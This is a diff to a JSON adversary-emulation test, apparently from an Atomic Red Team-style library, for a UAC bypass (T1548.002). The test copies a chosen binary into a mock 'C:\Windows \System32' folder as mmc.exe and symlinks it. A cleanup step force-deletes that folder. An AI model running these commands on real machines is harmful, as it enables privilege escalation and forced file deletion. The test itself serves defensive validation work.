@@ -7,39 +7,39 @@
   ],
   "steps": [
     {
-      "id": "6360c76d-fb88-4e31-811f-8fa4ca201684",
+      "id": "f331a7f4-3ef3-420b-aafd-4646f52d71c1",
       "type": "execute-command",
       "data": {
         "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "7218e5aa-a85e-4faf-a6e5-af51bcc17ee4",
+      "id": "88f02664-2de7-4bcd-991a-4b9603224cff",
       "type": "execute-command",
       "data": {
         "command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q \u003enul 2\u003enul\ndel \"c:\\testbypass.exe\" \u003enul 2\u003enul\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "6360c76d-fb88-4e31-811f-8fa4ca201684",
+      "s": "f331a7f4-3ef3-420b-aafd-4646f52d71c1",
       "p": "on-success",
-      "o": "7218e5aa-a85e-4faf-a6e5-af51bcc17ee4"
+      "o": "88f02664-2de7-4bcd-991a-4b9603224cff"
     },
     {
-      "s": "6360c76d-fb88-4e31-811f-8fa4ca201684",
+      "s": "f331a7f4-3ef3-420b-aafd-4646f52d71c1",
       "p": "on-failure",
-      "o": "7218e5aa-a85e-4faf-a6e5-af51bcc17ee4"
+      "o": "88f02664-2de7-4bcd-991a-4b9603224cff"
     }
   ],
   "tags": [
-    "T1548.002",
-    "atomic-red-team"
+    "T1548",
+    "T1548.002"
   ],
   "input_arguments": [
     {
